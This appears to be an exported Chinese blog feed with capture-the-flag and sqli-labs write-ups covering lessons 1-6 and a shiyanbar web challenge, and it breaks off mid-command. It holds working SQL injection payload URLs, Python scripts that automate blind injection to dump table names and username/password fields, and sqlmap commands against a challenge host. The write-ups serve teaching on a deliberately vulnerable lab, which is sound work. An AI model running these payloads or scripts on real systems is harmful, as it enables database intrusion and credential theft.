        <content type="html"><![CDATA[<h1 id="sqli-labs5-6-盲注"><a href="#sqli-labs5-6-盲注" class="headerlink" title="sqli-labs5-6(盲注)"></a>sqli-labs5-6(盲注)</h1><p>[TOC]</p><p>盲注分为以下三类：</p><p>Booleanbase（普通盲注）<br>Timebase（时间盲注）<br>Errorbase（基于报错的盲注）</p><h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p><p>这种类型的SQL注入属于盲注型，使用id=1\观察报错信息<br><a href="http://43.247.91.228:84/Less-5/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1\</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171016_51.png" alt=""></p><pre><code> MySQL server version for the right syntax to use near &#39;&#39;1\&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><p>near ‘’1’’ LIMIT 0,1’ at line 1</p><p>分离最外层的单引号：</p><p>near ‘       ‘   1’  ‘ LIMIT 0,1            ‘ at line 1</p><p>1’是手动输入的，但是还剩下一对双引号，说明后台sql语句应该是这样：</p><p>select * from talbe where id = ‘input’ </p><h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p><h3 id="3-猜测当前数据库名"><a href="#3-猜测当前数据库名" class="headerlink" title="3.猜测当前数据库名"></a>3.猜测当前数据库名</h3><p>方法一： python跑</p><pre><code>import requestsimport stringdataset = &quot; abcdefghijklmnopqrstuvwxyz_&quot;def sendPayload(payload):    url = &quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+ payload    content = requests.get(url).text    return contentdef get_db_length():    count = 1    while count:        payload = &quot;and length(database())=&quot;        payload = payload + str(count) + &quot;%23&quot;        recv = sendPayload(payload)        if &quot;You are in&quot; in recv:            return count        else:            count += 1def getdbName(length):    result=&quot;&quot;    for k in range(length+1):            for j in dataset:                    payload=&quot;and left(database(),&quot;+str(k)+&quot;)=&#39;&quot;+result+j+&quot;&#39;%23&quot;                    recv=sendPayload(payload)                    if &quot;You are in&quot; in recv:                        if j !=&#39; &#39;:                            result+=j                            print result                        breakdef main():    length = get_db_length()     print &quot;the length of database is &quot;,length     getdbName(length)if __name__==&quot;__main__&quot;:    main()</code></pre><p>这里跑出来以后数据库名字是security。<br>方法二手注left：<br><a href="http://43.247.91.228:84/Less-5/?id=1‘" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1‘</a> and (left(database(),1)=’s’)–+<br>left(database(),1)=’s’表示数据库名从左往右取一个字符，判断该字符是否等于s<br>left(database(),2)=’se’表示数据库名从左往右取两个个字符，判断该字符是否等于se</p><p>方法三：使用ascii()函数和substr()函数进行夹逼 </p><blockquote><p>▲ascii(substr((select database()),1,1))=98<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p></blockquote><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p><p>猜测当前数据库名的第二位字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),2,1)&gt;100%23<br>以此类推，最后得到当前数据库名为“security”。 </p><h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘  and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108%23</p><p>方法二：</p><p>已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。</p><pre><code>#!/usr/bin/env python#coding=utf-8import requestsimport stringdef get_data(payload):    url=&quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+payload    content=requests.get(url).text    return contentdef get_table_length(i):    for j in range(0,20):        payload=&quot;and (select length(table_name) from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1)=&quot;+str(j)+&quot;%23&quot;        #print payload        recv=get_data(payload)        if &quot;You are in&quot; in recv:            #print j            return jdef get_TableName():    for i in range(0,20):        result=&quot;&quot;        table_length=get_table_length(i)        if table_length is None:            break        #print table_length        for j in range(table_length+1):            for k in range(48,122):                payload=&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1),&quot;+str(j)+&quot;,1))=&quot;+str(k)+&quot;%23&quot;                recv=get_data(payload)                if &quot;You are in&quot; in recv:                    result+=chr(k)                    print result                    breakdef main():    get_TableName()if __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803171315_415.png" alt=""></p><h3 id="5-爆列名-表users下的所有列名"><a href="#5-爆列名-表users下的所有列名" class="headerlink" title="5.爆列名(表users下的所有列名)"></a>5.爆列名(表users下的所有列名)</h3><p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。<br>猜解列的个数<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and %d=(select count(column_name) from information_schema.columns where table_name=’users’)–+<br>猜解列名长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+<br>猜解列名<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p><h3 id="6-爆出字段值-security-users下所有的账号密码"><a href="#6-爆出字段值-security-users下所有的账号密码" class="headerlink" title="6.爆出字段值(security.users下所有的账号密码)"></a>6.爆出字段值(security.users下所有的账号密码)</h3><p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and 1=(select count(username) from security.users)–+<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+<br>判断字段值<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p><h3 id="完整python代码"><a href="#完整python代码" class="headerlink" title="完整python代码"></a>完整python代码</h3><pre><code>import requestsurl = &#39;http://192.168.1.158/sqlilabs/Less-5/?id=1&#39;db_length = 0db_name = &#39;&#39;table_num = 0table_len = 0table_name = &#39;&#39;table_list = []column_num = 0column_len = 0column_name = &#39;&#39;column_list = []dump_num = 0dump_len = 0dump_name = &#39;&#39;dump_list = []i = j = k = 0### 当前数据库名长度 ###for i in range(1,20):    db_payload = &#39;&#39;&#39;&#39; and (length(database())=%d)--+&#39;&#39;&#39; %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if &quot;You are in&quot; in r.text:        db_length = i        print(&#39;当前数据库名长度为：%d&#39; % db_length)        break### 当前数据库名 ###print(&#39;开始猜解数据库名......&#39;)for i in range(1,db_length+1):    for j in range(95,123):        db_payload = &#39;&#39;&#39;&#39; and (left(database(),%d)=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            db_name += chr(j)            # print(db_name)            breakprint(&#39;数据库名：\n[+]&#39;,db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = &#39;&#39;&#39;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if &quot;You are in&quot; in r.text:        table_num = i        breakprint(&#39;一共有%d张表&#39; % table_num)print(&#39;开始猜解表名......&#39;)### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = &#39;&#39;    #### 表名长度 ####    for j in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if &quot;You are in&quot; not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if &quot;You are in&quot; in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint(&#39;表名：&#39;,table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&#39;&#39;&#39; % (        j, i)        r = requests.get(url + db_payload)        if &quot;You are in&quot; in r.text:            column_num = j            print((&quot;[+] 表名：%-10s\t&quot; % i) + str(column_num) + &#39;字段&#39;)            break#### 猜解列名长度 ####column_num = 3print(&#39;%s表中的列名：&#39; % table_list[-1])for j in range(3):    column_name = &#39;&#39;    for k in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if &quot;You are in&quot; not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if &quot;You are in&quot; in r.text:                column_name += chr(l)    print(&#39;[+] &#39;,column_name)    column_list.append(column_name)print(&#39;开始爆破以下字段：&#39;,column_list[1:])for column in column_list[1:]:    print(column,&#39;：&#39;)    dump_num = 0    for i in range(30):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(%s) from %s.%s)--+&#39;&#39;&#39; % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = &#39;&#39;        #### 字段长度 ####        for j in range(1, 21):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if &quot;You are in&quot; not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if &quot;You are in&quot; in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print(&#39;[+]&#39;,dump_name)</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sqli-labs  1-4</title>
      <link href="/archis/239c6225/"/>
      <url>/archis/239c6225/</url>
      
        <content type="html"><![CDATA[<h1 id="Sqli-labs-1-4"><a href="#Sqli-labs-1-4" class="headerlink" title="Sqli-labs  1-4"></a>Sqli-labs  1-4</h1><p>[TOC]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p><p>##安装<br>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170021_645.png" alt=""></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1</p><p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1</p><p>最外层的单引号是标识错误的，将其隔离</p><pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p><pre><code>select uername,password from talble where id = &#39;input&#39;-----&gt;select uername,password from talble where id = &#39;input 攻击代码&#39;</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170025_607.png" alt=""></p><blockquote><p>使用union语句查询时，必须使前面的语句查询出错(例如id=-1，而id中并没有为-1的)，以为当查询出错时，sql语句结果为空，也就会显示我们构造的sql语句所查询的内容，即union之后语句的执行结果。</p></blockquote><p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170038_567.png" alt=""></p><p>6.暴列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.<strong>columns</strong> where <strong>table_name</strong>=’users’–+</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170043_887.png" alt=""></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p><pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层单引号：</p><pre><code>near &#39;     &#39; LIMIT 0,1     &#39; at line 1</code></pre><p>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：</p><pre><code>select username,password from table where id = input</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170110_138.png" alt=""></p><h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170121_987.png" alt=""></p><pre><code>MySQL server version for the right syntax to use near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>现将外层单引号去掉</p><pre><code>near &#39;              &#39;  1\  &#39;) LIMIT 0,1           &#39; at line 1</code></pre><p> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )</p><p>所以修改sql语句：</p><p>select username，password from table where id = (‘input’)</p><p>所以再用这样的代码来进行注入：</p><pre><code>?id=1′) –-+</code></pre><p>1’) and (‘1’=’1<br>放入sql语句中：</p><p>select username，password from table where id = (‘  1’) and (‘1’=’1  ‘)</p><p>2.确定字段个数</p><p>3.判断回显位(2,3处为显示位)</p><p>4.爆数据库名字、连接账号信息</p><p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p><h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near ‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p><pre><code>near &#39;&quot;3\&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层的单引号，那是用来标识错误信息的</p><pre><code>near &#39;           &quot;  3\  &quot;) LIMIT 0,1             &#39; at line 1</code></pre><p>其中 3\ 是手动输入的，还剩下””)</p><p>说明sql语句中应该有 (“”)   （ 括号也配对）</p><p>再次猜测sql语句：</p><pre><code>select * username,password from table where id = (&quot;input&quot;)</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170145_156.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧web—writeup</title>
      <link href="/archis/79216fa/"/>
      <url>/archis/79216fa/</url>
      
        <content type="html"><![CDATA[<h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181631_235.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181631_176.png" alt=""></p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181643_54.png" alt=""></p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p><p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p><p>回显</p><p>available databases [2]:<br>[<em>] information_schema<br>[</em>] test<br>注表名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” –tables –level 5<br>回显</p><p>Database: test<br>[1 table]<br>+——-+<br>| admin |<br>+——-+<br>注字段名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” –columns –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[2 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| password | varchar(100) |<br>| username | varchar(100) |<br>+———-+————–+<br>直接注密码内容</p><p>sqlmap -u “<a 